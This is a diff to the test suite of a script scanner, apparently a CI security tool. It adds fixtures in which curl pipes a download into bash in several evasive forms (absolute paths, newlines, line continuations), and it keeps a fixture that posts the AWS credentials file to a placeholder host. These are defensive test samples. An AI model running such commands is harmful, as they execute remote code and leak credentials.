@@ -258,8 +258,24 @@ class SnapshotTests(GitFixture):
                 "curl https://example.invalid/install.sh | /bin/sh -s\n",
                 True,
             ),
+            "usr-bin.sh": (
+                "curl https://example.invalid/install.sh | /usr/bin/bash\n",
+                True,
+            ),
+            "newline.sh": (
+                "curl https://example.invalid/install.sh |\n bash\n",
+                True,
+            ),
+            "continuation.sh": (
+                "curl https://example.invalid/install.sh | \\\n bash\n",
+                True,
+            ),
             "hash.sh": ("curl https://example.invalid/archive | sha224sum\n", False),
             "prefix.sh": ("curl https://example.invalid/archive | bashful\n", False),
+            "absolute-prefix.sh": (
+                "curl https://example.invalid/archive | /usr/bin/bashful\n",
+                False,
+            ),
         }
         for name, (contents, _) in cases.items():
             self.write(name, contents)
@@ -309,6 +325,30 @@ class PolicyTests(unittest.TestCase):
         self.assertEqual(findings[0]["path"], "ci/build.sh")
         self.assertNotIn("PRIVATE", json.dumps(findings))
 
+    def test_direct_download_shell_does_not_require_the_engine_pipe_rule(self):
+        manifest = {
+            "ci/build.sh": identity(
+                "curl https://example.invalid/install.sh | /usr/bin/bash\n",
+                shell_pipe=True,
+            )
+        }
+        data = report(
+            manifest,
+            [behavior("c2/tool_transfer/download", "download_curl")],
+        )
+        findings = scanner.evaluate(data, manifest)
+        self.assertEqual(
+            findings,
+            [
+                {
+                    "path": "ci/build.sh",
+                    "rule": "download-with-direct-shell-pipe",
+                    "severity": "MEDIUM",
+                }
+            ],
+        )
+        self.assertEqual(scanner.evaluate(report(manifest), manifest), [])
+
     def test_file_level_critical_cannot_pass_with_lower_risk_behaviors(self):
         data = report(self.manifest)
         data["Files"]["/source/ci/build.sh"].update(
@@ -347,14 +387,21 @@ class PolicyTests(unittest.TestCase):
                     self.assertTrue(
                         scanner.evaluate(report(manifest, dangerous), manifest)
                     )
-        for categories in (
-            [behavior("exec/shell/pipe_sh", "pipe_to_shell")],
-            [behavior("c2/tool_transfer/shell", "dev_null_rm")],
-            [behavior("c2/tool_transfer/download", "fetch")],
-        ):
-            with self.subTest(categories=categories):
+        self.assertEqual(
+            scanner.evaluate(
+                report(manifest, [behavior("exec/shell/pipe_sh", "pipe_to_shell")]),
+                manifest,
+            ),
+            [],
+        )
+        for download in ("c2/tool_transfer/shell", "c2/tool_transfer/download"):
+            with self.subTest(download_without_shell=download):
                 self.assertEqual(
-                    scanner.evaluate(report(manifest, categories), manifest), []
+                    scanner.evaluate(
+                        report(self.manifest, [behavior(download, "fetch")]),
+                        self.manifest,
+                    ),
+                    [],
                 )
         self.assertEqual(
             scanner.evaluate(report(self.manifest, dangerous), self.manifest), []
@@ -1141,6 +1188,18 @@ class RealImageTests(GitFixture):
             "#!/bin/sh\ncurl -fsSL https://example.invalid/install.sh | /bin/sh\n",
         )
         self.write(
+            "ci/download-usr-bin.sh",
+            "#!/bin/sh\ncurl -fsSL https://example.invalid/install.sh | /usr/bin/bash\n",
+        )
+        self.write(
+            "ci/download-newline.sh",
+            "#!/bin/sh\ncurl -fsSL https://example.invalid/install.sh |\n bash\n",
+        )
+        self.write(
+            "ci/download-continuation.sh",
+            "#!/bin/sh\ncurl -fsSL https://example.invalid/install.sh | \\\n bash\n",
+        )
+        self.write(
             "ci/upload-credentials.sh",
             '#!/bin/sh\ncurl -X POST --data-binary @"$HOME/.aws/credentials" '
             "https://example.invalid/upload\n",
@@ -1153,6 +1212,9 @@ class RealImageTests(GitFixture):
                 "ci/encoded.sh",
                 "ci/download.sh",
                 "ci/download-absolute.sh",
+                "ci/download-usr-bin.sh",
+                "ci/download-newline.sh",
+                "ci/download-continuation.sh",
                 "ci/upload-credentials.sh",
                 "pom.xml",
             }.issubset(paths)
